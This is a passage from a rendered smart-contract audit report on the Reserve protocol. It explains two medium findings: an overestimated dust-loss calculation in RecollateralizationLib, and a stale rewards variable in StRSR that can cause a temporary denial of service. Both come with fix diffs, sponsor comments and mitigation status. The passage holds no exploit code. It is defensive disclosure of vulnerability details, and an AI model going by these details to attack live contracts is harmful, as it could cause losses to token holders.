class=\"mtk1\">();</span></span></span></code></pre>\n<p>The team should consider the reason for the above logic.</p>\n<p>If the above logic is required, then I would suggest that <code>poke()</code> in <code>Main.sol</code> be called inside of <code>pause()</code> and <code>freezeUntil(...)</code> to update the state <strong>before</strong> pausing/freezing. Since <code>distribute(...)</code> has modifier <code>notPausedOrFrozen</code>, I would assume in pause/frozen state, no RSR is sent to stRSR contract (i.e. no rewards when paused/frozen) so this recommendation should be sufficient in preventing the issue.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/148#issuecomment-1406612686\">pmckelvy1 (Reserve) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">This PR makes the AssetRegistry more resilient to bad collateral during asset unregistration, and disables staking when frozen.&lt;br&gt;</span></span></code></pre>\n<p><a href=\"https://github.com/reserve-protocol/protocol/pull/623\">reserve-protocol/protocol#623</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/6\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/71\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/44\">AkshaySrivastav</a>.</p>\n<hr>\n<h2 id=\"m-22-recollateralizationlib-dust-loss-for-an-asset-should-be-capped-at-its-low-value\" style=\"position:relative;\"><a href=\"#m-22-recollateralizationlib-dust-loss-for-an-asset-should-be-capped-at-its-low-value\" aria-label=\"m 22 recollateralizationlib dust loss for an asset should be capped at its low value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/106\">[M-22] RecollateralizationLib: Dust loss for an asset should be capped at it’s low value</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/106\">HollaDieWaldfee</a></em></p>\n<p>The <code>RecollateralizationLib.basketRange</code> function (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L152-L202</a>) internally calls the <code>RecollateralizationLib.totalAssetValue</code> function (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L226-L281\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L226-L281</a>).</p>\n<p>I will show in this report that the <code>RecollateralizationLib.totalAssetValue</code> function returns a value for <code>assetsLow</code> that is too low.</p>\n<p>This in turn causes the <code>range.bottom</code> value (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L201\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L201</a>) that the <code>RecollateralizationLib.basketRange</code> function returns to be too low.</p>\n<p>Before showing why the <code>assetsLow</code> value is underestimated however I will explain the impact of the <code>range.bottom</code> variable being too low.</p>\n<p>There are two places where this value is used:</p>\n<h3 id=\"1-recollateralizationlibpreparerecollateralizationtrade-function\" style=\"position:relative;\"><a href=\"#1-recollateralizationlibpreparerecollateralizationtrade-function\" aria-label=\"1 recollateralizationlibpreparerecollateralizationtrade function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1. <code>RecollateralizationLib.prepareRecollateralizationTrade</code> function</h3>\n<p>This function passes the <code>range</code> to the <code>RecollateralizationLib.nextTradePair</code> function (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L88-L91\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L88-L91</a>)</p>\n<p>Since <code>range.bottom</code> is too low, the <code>needed</code> amount is too low (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L380\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L380</a>).</p>\n<p>This causes the <code>if</code> statement to not be executed in some cases when it otherwise would be executed (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L381-L396\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L381-L396</a>).</p>\n<p>And the <code>amtShort</code> is smaller than it should be (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L391\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L391</a>).</p>\n<p>In the end this causes recollateralization trades to not buy as much assets as they could buy. This is because the amount of assets is underestimated so the protocol can actually hold more baskets than it thinks it can.</p>\n<p>Therefore underestimating <code>assetsLow</code> causes a direct loss to RToken holders because the protocol will not recollateralize the RToken to the level that it can and should.</p>\n<h3 id=\"2-price-calculations-of-rtokenasset\" style=\"position:relative;\"><a href=\"#2-price-calculations-of-rtokenasset\" aria-label=\"2 price calculations of rtokenasset permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2. Price calculations of <code>RTokenAsset</code></h3>\n<p>A <code>RTokenAsset</code> uses the <code>RecollateralizationLib.basketRange</code> function to calculate its value:</p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L156\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L156</a></p>\n<p>The <code>RTokenAsset</code> therefore underestimates its <code>low</code> and <code>lotLow</code> prices:</p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L58\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L58</a></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L99\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/RTokenAsset.sol#L99</a></p>\n<p>This then can lead to issues in any places where the prices of <code>RTokenAsset</code>s are used.</p>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here is the affected line:</p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L275</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">potentialDustLoss</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">potentialDustLoss</span><span class=\"mtk1\">.</span><span class=\"mtk11\">plus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rules</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minTradeVolume</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>This line is executed for every asset in the <code>AssetRegistry</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L242\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/RecollateralizationLib.sol#L242</a>).</p>\n<p>So for every asset in the <code>AssetRegistry</code> a potential dust loss of <code>minTradeVolume</code> is added.</p>\n<p>The following scenario shows why this is wrong:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">assume minTradeVolume = $50</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">assume further the following:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">asset1 with low value $1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">asset2 with low value $1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">asset3 with low value $1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">asset4 with low value $200</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Currently potentialDustLoss will be 4*minTradeVolume = $200.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">So assetsLow = $203 - $200 = $3.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Dust loss should not be calculated with $50 for the first 3 assets.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Dust loss for an asset should be capped at its low value.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">So dust loss alltogether should be $1 + $1 + $1 + $50 = $53.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">So assetsLow should be $1+$1+$1+$200 - $53 = $150.</span></span></code></pre>\n<h3 id=\"tools-used-10\" style=\"position:relative;\"><a href=\"#tools-used-10\" aria-label=\"tools used 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-19\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-19\" aria-label=\"recommended mitigation steps 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>I suggest that an asset can only incur as much dust loss as its balance is.</p>\n<p>If the protocol only holds <code>$5</code> of asset A then this should not cause a dust loss of say <code>$10</code>.</p>\n<p>The fix first saves the <code>assetLow</code> value which should be saved to memory because it is now needed two times then it caps the dust loss of an asset at its low value:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/contracts/p1/mixins/RecollateralizationLib.sol b/contracts/p1/mixins/RecollateralizationLib.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index 648d1813..b5b86cac 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/contracts/p1/mixins/RecollateralizationLib.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/contracts/p1/mixins/RecollateralizationLib.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -261,7 +261,8 @@ library RecollateralizationLibP1 {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             // Intentionally include value of IFFY/DISABLED collateral when low is nonzero</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             // {UoA} = {UoA} + {UoA/tok} * {tok}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-            assetsLow += low.mul(bal, FLOOR);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+            uint192 assetLow = low.mul(bal,FLOOR);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+            assetsLow += assetLow;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             // += is same as Fix.plus</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             // assetsHigh += high.mul(bal, CEIL), where assetsHigh is [0, FIX_MAX]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -272,7 +273,7 @@ library RecollateralizationLibP1 {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             // += is same as Fix.plus</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             // Accumulate potential losses to dust</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-            potentialDustLoss = potentialDustLoss.plus(rules.minTradeVolume);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+            potentialDustLoss = potentialDustLoss.plus(fixMin(rules.minTradeVolume, assetLow));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         // Account for all the places dust could get stuck</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/106#issuecomment-1401992675\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>It would have been beneficial for the warden to use more realistic values for these trades with the full integer values to show how much of an actual impact this has when we are talking about tokens with 6 or more decimals. Will leave open for sponsor comment.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/106#issuecomment-1406903842\">pmckelvy1 (Reserve) disputed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/106#issuecomment-1406905121\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>The balance of the asset before trading has nothing to do with how much value can potentially be lost when we try to <em>trade into</em> that asset. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/106#issuecomment-1407107703\">tbrent (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>On further thought, this is not really a good response. We have access to the UoA from the asset, and we could use that to potentially limit the contribution to <code>potentialDustLoss</code>. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed\">tbrent (Reserve) mitigated</a>:</strong></p>\n<blockquote>\n<p>This PR simplifies and improves the basket range formula. The new logic should provide much tighter basket range estimates and result in smaller haircuts.<br>\n<a href=\"https://github.com/reserve-protocol/protocol/pull/585\">reserve-protocol/protocol#585</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/5\">HollaDieWaldfee</a> and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/64\">0xA5DF</a>.</p>\n<hr>\n<h2 id=\"m-23-strsr-seizersr-function-fails-to-update-rsrrewardsatlastpayout-variable\" style=\"position:relative;\"><a href=\"#m-23-strsr-seizersr-function-fails-to-update-rsrrewardsatlastpayout-variable\" aria-label=\"m 23 strsr seizersr function fails to update rsrrewardsatlastpayout variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/64\">[M-23] StRSR: seizeRSR function fails to update rsrRewardsAtLastPayout variable</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/64\">HollaDieWaldfee</a></em></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L374-L422\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L374-L422</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598</a><br>\n<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L496-L530\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L496-L530</a></p>\n<p>If a RToken is under-collateralized, the <code>BackingManager</code> can call the <code>StRSR.seizeRSR</code> function (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L141\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L141</a>).</p>\n<p>This sends some amount of <code>rsr</code> held by the <code>StRSR</code> contract to the <code>BackingManager</code> which can then be traded for other tokens in order to recollateralize the RToken.</p>\n<p>There are 3 pools of <code>rsr</code> in the <code>StRSR</code> contract that <code>StRSR.seizeRSR</code> claims <code>rsr</code> from.</p>\n<ol>\n<li><code>stakeRSR</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L386-L398\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L386-L398</a>)</li>\n<li><code>draftRSR</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L401-L414\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L401-L414</a>)</li>\n<li>rewards (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L417\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L417</a>)</li>\n</ol>\n<p>The <code>rsr</code> taken from the rewards is what is interesting in this report.</p>\n<p>The issue is that the <code>StRSR._payoutRewards</code> function (which is used to pay <code>rsr</code> rewards to stakers over time) keeps track of the available rewards to distribute in the <code>rsrRewardsAtLastPayout</code> variable (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L517\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L517</a>).</p>\n<p>When the <code>StRSR.seizeRSR</code> function is called (taking away rewards and sending them to the <code>BackingManager</code>) and after that <code>StRSR._payoutRewards</code> is called, <code>StRSR._payoutRewards</code> uses the <code>rsrRewardsAtLastPayout</code> variable that was set before the seizure (the actual amount of rewards is smaller after the seizure).</p>\n<p>Thereby the amount by which <code>StRSR.stakeRSR</code> is increased (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513</a>) when rewards are paid out can be greater than the actual rewards that are available.</p>\n<h3 id=\"proof-of-concept-and-further-assessment-of-impact\" style=\"position:relative;\"><a href=\"#proof-of-concept-and-further-assessment-of-impact\" aria-label=\"proof of concept and further assessment of impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept and further assessment of Impact</h3>\n<p>The fact that the <code>rsrRewardsAtLastPayout</code> variable is too big after a call to <code>StRSR.seizeRSR</code> has two consequences when <code>StRSR._payoutRewards</code> is called:</p>\n<ol>\n<li><code>stakeRSR</code> is increased by an amount that is larger than it should be (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513</a>)</li>\n<li><code>stakeRate</code> (which uses division by <code>stakeRSR</code> when calculated) is smaller than it should be (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L524-L526\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L524-L526</a>)</li>\n</ol>\n<p>Both affected variables can in principle be off by a large amount. In practice this is not likely because the rewards paid out will be small in comparison to <code>stakeRSR</code>.</p>\n<p>Also after a second call to <code>StRSR._payoutRewards</code> all variables are in sync again and the problem has solved itself. The excess payouts are then accounted for by the <code>StRSR.rsrRewards</code> function.</p>\n<p>So there is a small amount of time for any real issue to occur and there does not always occur an issue when <code>StRSR.seizeRSR</code> is called.</p>\n<p>That being said, the behavior described so far can cause a temporary DOS:</p>\n<p>In <code>StRSR._payoutRewards</code>, <code>stakeRSR</code> is increased (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L513</a>), then <code>StRSR.rsrRewards</code> is called which calculates <code>rsr.balanceOf(address(this)) - stakeRSR - draftRSR</code> (<a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L596-L598</a>).</p>\n<p>The falsely paid out amount of rewards can increase <code>StRSR.stakeRSR</code> so much that this line reverts due to underflow.</p>\n<p>This can cause DOS when <code>StRSR.seizeRSR</code> is called again because it internally calls <code>StRSR.rsrRewards</code>.</p>\n<p>This will solve itself when more <code>rsr</code> accumulates in the contract due to revenue which makes the balance increase or someone can just send <code>rsr</code> and thereby increase the balance.</p>\n<p>The DOS occurs also in all functions that internally call <code>StRSR._payoutRewards</code> (<code>StRSR.stake</code> and <code>StRSR.unstake</code>):</p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L215\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L215</a></p>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L262\">https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L262</a></p>\n<p>Overall the impact of this on the average RToken is quite limited but as explained above it can definitely cause 